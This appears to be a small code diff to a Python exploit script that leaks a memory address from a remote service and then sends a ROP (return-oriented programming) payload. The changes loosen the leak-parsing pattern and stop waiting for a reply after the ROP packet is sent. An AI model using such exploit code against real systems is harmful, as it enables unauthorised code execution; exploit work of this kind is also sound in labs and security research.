@@ -8,7 +8,7 @@ from struct import pack
 
 from exploit_scaffold import OP_LEAK, OP_ROP, build_packet, send_packet
 
-LEAK_PATTERN = re.compile(rb"LEAK:(0x[0-9A-Fa-f]+)")
+LEAK_PATTERN = re.compile(rb"LEAK:(?:0x)?([0-9A-Fa-f]+)")
 
 
 def request_leak(host: str, port: int) -> int:
@@ -75,7 +75,12 @@ def main() -> None:
         return
 
     payload = build_control_payload(args.offset, args.target, args.length)
-    response = send_packet(args.host, args.port, build_packet(OP_ROP, payload))
+    response = send_packet(
+        args.host,
+        args.port,
+        build_packet(OP_ROP, payload),
+        expect_response=False,
+    )
     if response:
         print(response.decode("ascii", errors="replace"), end="")
 
